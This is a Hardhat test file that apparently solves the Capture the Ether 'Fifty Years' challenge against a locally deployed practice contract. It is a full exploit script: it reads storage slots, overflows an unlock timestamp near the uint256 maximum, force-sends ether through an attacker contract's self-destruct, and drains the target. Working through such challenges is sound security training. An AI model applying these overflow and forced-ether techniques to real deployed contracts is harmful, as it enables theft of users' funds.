import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider, constants } = ethers;

describe('FiftyYearsChallenge', () => {
  let target: Contract;
  let attacker: Contract;
  let owner: SignerWithAddress;

  before(async () => {
    // remove fork
    await network.provider.request({
      method: 'hardhat_reset',
      params: [],
    });

    [owner] = await ethers.getSigners();

    const AttackerFactory = await ethers.getContractFactory('FiftyYearsChallengeAttacker');
    attacker = await AttackerFactory.deploy();
    await attacker.deployed();

    const TargetFactory = await ethers.getContractFactory('FiftyYearsChallenge');
    target = await TargetFactory.deploy(owner.address, {
      value: utils.parseEther('1'),
    });
    await target.deployed();

    console.log('deployed on', target.address);
  });

  async function getBalanceOf(address: string) {
    const balance = await provider.getBalance(address);
    console.log('balance', address, utils.formatEther(balance));
    return balance;
  }

  async function getContribution(index: number) {
    const [amount, timestamp] = await target.getContribution(index);
    console.log('contribution', utils.formatEther(amount), timestamp.toString());
    return { amount, timestamp };
  }

  function get256HexValue(value: number | string) {
    return utils.hexlify(utils.hexZeroPad(BigNumber.from(value).toHexString(), 32));
  }

  function getStorageItem(slotNumber: number | string) {
    return provider.getStorageAt(target.address, slotNumber);
  }

  it('Exploit', async () => {
    // await getBalanceOf(target.address);

    // console.log('array length', await getStorageItem(0));

    const arraySlotPosition = get256HexValue(0);
    const firstArrayItemPosition = utils.keccak256(arraySlotPosition);
    const [amount, unlockTimestamp] = await Promise.all([
      getStorageItem(firstArrayItemPosition),
      getStorageItem(BigNumber.from(firstArrayItemPosition).add(1).toHexString()),
    ]);

    // console.log('contribution', utils.formatEther(amount));
    // console.log('unlock date', new Date(BigNumber.from(unlockTimestamp).toNumber() * 1000));

    // const newContributionUnlockTimestamp = constants.MaxInt256.sub(BigNumber.from(unlockTimestamp));
    const newContributionUnlockTimestamp = constants.MaxUint256.sub(60 * 60 * 24 - 1);

    // console.log('asdsadasdsad', constants.MaxUint256.toHexString());

    // console.log('array length', await getStorageItem(0));
    // console.log('head', await getStorageItem(1));
    // console.log('owner', await getStorageItem(2));

    // console.log('last timestamp', await target.getLastItemTimestamp());

    // console.log('new timestamp', newContributionUnlockTimestamp);
    let tx;
    tx = await target.upsert(1, newContributionUnlockTimestamp.toString(), {
      value: '1',
    });
    await tx.wait();

    /*
    console.log('element value', 0, utils.formatEther(await target.getValue(0)));
    console.log('element value', 1, utils.formatEther(await target.getValue(1)));

    console.log('last timestamp', await target.getLastItemTimestamp());

    console.log('array length', await getStorageItem(0));
    console.log('head', await getStorageItem(1));
    console.log('owner', await getStorageItem(2));
    */

    tx = await target.upsert(2, 0, {
      value: '2',
    });
    await tx.wait();

    console.log(
      'target total balance',
      utils.formatEther(await provider.getBalance(target.address))
    );

    console.log('array length', await getStorageItem(0));

    console.log('element value', 0, utils.formatEther(await target.getValue(0)));
    console.log('element value', 1, utils.formatEther(await target.getValue(1)));
    console.log('element value', 2, utils.formatEther(await target.getValue(2)));

    // console.log('head', await getStorageItem(1));
    // console.log('owner', await getStorageItem(2));

    // console.log('asda', owner.address);

    // console.log('target balance', utils.formatEther(await provider.getBalance(target.address)));
    /*
    console.log('send the difference');
    const targetBalance = await provider.getBalance(target.address);
    console.log('target total balance', utils.formatEther(await provider.getBalance(target.address)));

    console.log('total', utils.formatEther(await target.getTotal()));
*/

    /*
      the diference is because the array length autoincrements before the item is pushed
    */
    console.log('send the difference');
    tx = await attacker.seppuku(target.address, {
      value: 2,
    });

    console.log('withdraw');
    tx = await target.withdraw(2);
    await tx.wait();

    console.log('target balance', utils.formatEther(await provider.getBalance(target.address)));
  });

  after(async () => {
    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
